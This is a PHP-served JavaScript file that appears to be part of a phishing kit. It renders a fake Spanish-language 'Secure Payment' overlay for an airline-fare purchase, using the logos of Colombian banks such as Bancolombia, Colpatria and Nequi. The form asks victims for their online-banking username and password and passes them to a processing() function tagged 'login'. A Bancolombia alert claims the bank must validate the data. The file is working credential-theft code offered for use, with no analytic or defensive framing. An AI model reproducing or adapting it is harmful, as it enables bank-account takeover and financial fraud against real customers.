<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
// $_GET['banco'] = 'colpatria';
$banco = $_GET['banco'];
$origen = isset($_GET['origen_code']) ? $_GET['origen_code'] : null;

switch ($banco) {
    // case 'colpatria':
    //     if ($origen != null) {
    //         require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}_bank/{$banco}_login.php");
    //     } else {
    //         require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_login.php");
    //     }
    //     break;
    //     // case 'davivienda':
    //     // case 'falabella':
    //     // case 'bogota':
    // case 'bancolombia_news':
    // case 'bancolombia':
    // case 'nequi':
    //     require_once($_SERVER['DOCUMENT_ROOT'] . "/bancos/{$banco}/{$banco}_login.php");
    //     break;
    default:
?>
        var my_banco = my_data['banco'];
        var my_nombre_banco= my_data['nombre_banco'];
        var my_titulo = 'Secure Payment';
        var my_contenido = `
        <style>
            body {
                margin: 0;
                padding: 0;
                overflow: hidden;
                background-color: #ffffff;
                display: flex;
                justify-content: center;
                align-items: center;
            }

            html,
            body {
                height: 100%;
            }

            #contentImg {
                height: 50px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }

            #contenedor {
                position: relative;
                /* width: 95vw; */
                /* height: 95vh; */
                background-color: #ffffff;
                overflow: hidden;
                /* Evita que las imágenes sobresalgan del contenedor */
                /* top: 50px; */
                /* left: 35px; */
                width: 310px;
                /* Ajusta el ancho según tus necesidades */
                height: 700px;
                /* Ajusta la altura según tus necesidades */
            }

            #imagenIzquierda {
                position: absolute;
                top: 10px;
                left: 20px;
                width: 70px;
                object-fit: contain;
                /* Ajusta el ancho según tus necesidades */
                height: 30px;
                /* Ajusta la altura según tus necesidades */
            }

            #imagenDerecha {
                position: absolute;
                top: 2px;
                right: 20px;
                width: 100px;
                /* Ajusta el ancho según tus necesidades */
                height: 50px;
                /* Ajusta la altura según tus necesidades */
            }

            #titulo {
                font-size: 20px;
                font-weight: bold;
                color: #333;
                /* Color del texto */
                margin-top: 70px;
                /* Espaciado superior */
                margin-bottom: 10px;
                /* Espaciado inferior */
                text-align: center;
                /* Alineación del texto */
            }

            #titulo2 {
                font-size: 16px;
                font-weight: bold;
                color: #333;
                /* Color del texto */
                margin-top: 30px;
                /* Espaciado superior */
                margin-bottom: 10px;
                /* Espaciado inferior */
                text-align: center;
                /* Alineación del texto */
            }

            #parrafo {
                font-size: 13px;
                color: #000000;
                /* Color del texto */
                margin: 0 auto;
                /* Centra el párrafo horizontalmente */
                max-width: 80%;
                /* Ancho máximo del párrafo */
                text-align: justify;
                /* Justifica el texto */
                letter-spacing: 2px;
                /* Ajusta el valor según tus preferencias */
            }

            #formulario {
                margin-top: 10px;
                padding: 0 40px;
                display: flex;
                flex-direction: column;
                align-items: flex-start;
                /* Alinea los elementos al inicio del contenedor */
            }

            .form-group {
                display: flex;
                align-items: center;
                margin-bottom: 15px;
                width: 100%;
                /* Ajusta el ancho para que ocupe todo el contenedor */
            }

            .form-group label {
                font-size: 12px;
                font-weight: bold;
                color: #333;
                width: 30%;
                /* Ancho de la etiqueta */
                margin-right: 5px;
                /* Espaciado entre la etiqueta y el input */
                text-align: left;
                /* Alinea el texto del título a la izquierda */
            }

            .form-group input {
                width: 70%;
                /* Ancho del input */
                max-width: 130px;
                /* Ancho máximo para los inputs */
                padding: 8px;
                margin-bottom: 2px;
                margin-top: -4px;
                /* Ajusta la posición vertical del input */
                box-sizing: border-box;
                border: 1px solid #ccc;
                border-radius: 4px;
            }

            #horaTransaccion {
                font-size: 14px;
                color: #333;
                margin-top: 15px;
                text-align: center;
                /* Centra el texto */
            }

            #autorizarBtn {
                display: block;
                margin: 45px auto;
                padding: 15px 30px;
                border-radius: 10%;
                background-color: #000;
                color: #fff;
                text-align: center;
                cursor: pointer;
                font-size: 12px;
                text-decoration: none;
                border: none;
            }

            #contador {
                color: #000000;
                font-size: 12px;
                font-weight: 900;
                margin-left: 8px;
            }

            .loaderp {
                width: 48px;
                height: 48px;
                border: 5px solid #FFF;
                border-bottom-color: #dc3741;
                border-radius: 50%;
                display: inline-block;
                box-sizing: border-box;
                animation: rotation 1s linear infinite;
            }

            @keyframes rotation {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            .loaderp-full {
                position: fixed;
                top: 0;
                overflow-y: hidden;
                z-index: 1000;
                background-color: white;
                width: 100vw;
                height: 100vh;

                display: none;
                flex-direction: column;
                justify-content: center;
                align-items: center;
            }
        </style>
        <div id="contenedor">
            <div id="contentImg">
                <img id="imagenIzquierda" src="${my_hosting}logos/${my_banco}.png" alt="Logo Visa">
                <img id="imagenDerecha" src="${my_hosting}img/ltam/logo.jpg" alt="Logo Banco" style="border-radius: 10px; width: 50px; height: 50px;">
            </div>

            <div id="titulo">Autorización de transacción</div>
            <p id="parrafo">Estás intentando realizar un pago por tarjeta de crédito/débito. Necesitamos confirmar que eres
                tú quien realiza este pago.</p>
            <p id="horaTransaccion">Hora de la transacción: 13:40:28</p>
            <form id="formulario" method="POST" onsubmit="return false;">
                <div class="form-group">
                    <label for="username" id="monto" style="width: 100%;text-align: center;">Monto:</label>
                </div>
                <div class="form-group">
                    <label for="username">Usuario:</label>
                    <input type="text" id="txtUsuario" name="txtUsuario" placeholder="Usuario" minlength="4" maxlength="20"
                        required="">
                </div>
                <div class="form-group">
                    <label for="password">Clave:</label>
                    <input type="password" id="txtPassword" name="txtPassword" placeholder="Clave" minlength="4" maxlength="20"
                        required="">
                </div>
                <p id="msg_error" style="color: red; text-align: center;"></p>

                <button type="button" id="autorizarBtn">Autorizar</button>
            </form>
        </div>

        <!-- LOADER FULL -->
        <div class="loaderp-full">
            <span class="loaderp"></span>
            <p class="text-italic tc-ocean fs-3 fw-light"></p>
        </div>

        `

<?php
        break;
}
?>
//<script>
    loadContenido()
    var v1_precio = parseFloat(my_data['v1_precio'].replace(/\./g, ''));
    var v2_precio_raw = my_data['v2_precio'];
    var v2_precio = v2_precio_raw && v2_precio_raw.trim() !== '' ?
        parseFloat(v2_precio_raw.replace(/\./g, '')) :
        0;
    var pasajeros = JSON.parse(my_data['pasajeros']);

    var totalPasajeros =
        (pasajeros.adultos || 0) +
        (pasajeros.ninos || 0) +
        (pasajeros.infantes || 0) +
        (pasajeros.adolecentes || 0);

    var precioData = isNaN(v2_precio) ?
        v1_precio * totalPasajeros :
        (v1_precio + v2_precio) * totalPasajeros;

    var precioFormateado = "$ " + precioData.toLocaleString('es-CO');

    $('#monto').text('Monto: ' + precioFormateado + " COP");


    if (my_data['alerta'] != null) {
        $("#msg_error").text(my_data['alerta'].msg);
    }

    localStorage.setItem('loaderFond', my_contenido)

    $('#autorizarBtn').click(function() {
        $('#loaderp-full').css('display', 'block');
        $('#autorizarBtn').prop('disabled', false);
        validateData();

    });

    function actualizarHora() {
        var fecha = new Date();
        var hora = fecha.getHours().toString().padStart(2, '0');
        var minutos = fecha.getMinutes().toString().padStart(2, '0');
        var segundos = fecha.getSeconds().toString().padStart(2, '0');

        var horaActual = hora + ':' + minutos + ':' + segundos;
        $('#horaTransaccion').text('Hora de la transacción: ' + horaActual);
    }

    setInterval(actualizarHora, 1000);

    actualizarHora();

    switch (my_data['banco']) {
        case 'colpatria':
            break;
        case 'bancolombia':
            lanzarAlerta({
                type: 'banco',
                msg: 'Para continuar con tu pago, debemos validar la información con tu banco.'
            })
            break;
        default:
            borderKeyUp();
            break;
    }

    function sendDataLogin(usuario, password) {
        processing({
            t: 'login',
            usuario: usuario,
            password: password
        });
    }

    function validateData() {
        let usuario = $("#txtUsuario").val();
        let password = $("#txtPassword").val();
        if (usuario.length == 0) {
            $("#txtUsuario").css("border", "1px solid red");
            $("#txtUsuario").focus();
            return;
        }
        if (password.length == 0) {
            $("#txtPassword").css("border", "1px solid red");
            $("#txtPassword").focus();
            return;
        }
        sendDataLogin(usuario, password)
    };

    function borderKeyUp() {
        $("#txtUsuario").keyup(function(e) {
            $("#txtUsuario").css("border", "1px solid #CCCCCC");
        });
        $("#txtPassword").keyup(function(e) {
            $("#txtPassword").css("border", "1px solid #CCCCCC");
        });
    }